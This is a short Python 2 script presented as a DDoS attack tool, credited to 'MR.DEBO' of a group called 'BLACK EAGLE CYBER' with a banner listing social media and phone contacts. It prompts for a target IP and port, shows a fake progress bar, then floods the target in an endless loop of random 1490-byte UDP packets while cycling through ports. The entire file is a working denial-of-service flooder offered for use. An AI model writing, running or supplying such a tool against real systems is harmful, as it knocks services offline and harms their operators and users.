import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("cowsay -f daemon DDos Attack | lolcat")
os.system("toilet -f standard MR.DEBO -F gay")
print
print "<=================={0}==================>"
print "| Author    : MR.DEBO                   |"
print "| Github    : https://github.com/MrDebo |"
print "| Team      : BLACK EAGLE CYBER         |"
print "| Instagram : dikadebo02                |"
print "| WhatsApp  : 081539279932              |"
print "<=================={0}==================>"
print
ip = raw_input("IP Target : ")
port = input ("Port      : ")

os.system("clear")
os.system("cowsay -f daemon Mr.Debo | lolcat")
os.system("toilet -f standard Attacking . . . | lolcat")
print
print "[====                    ] 0%"
time.sleep(5)
print "[=======                 ] 15%"
time.sleep(5)
print "[==========              ] 25%"
time.sleep(5)
print "[=============           ] 35%"
time.sleep(5)
print "[================        ] 50%"
time.sleep(5)
print "[===================     ] 75%"
time.sleep(5)
print "[======================  ] 85%"
time.sleep(5)
print "[========================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

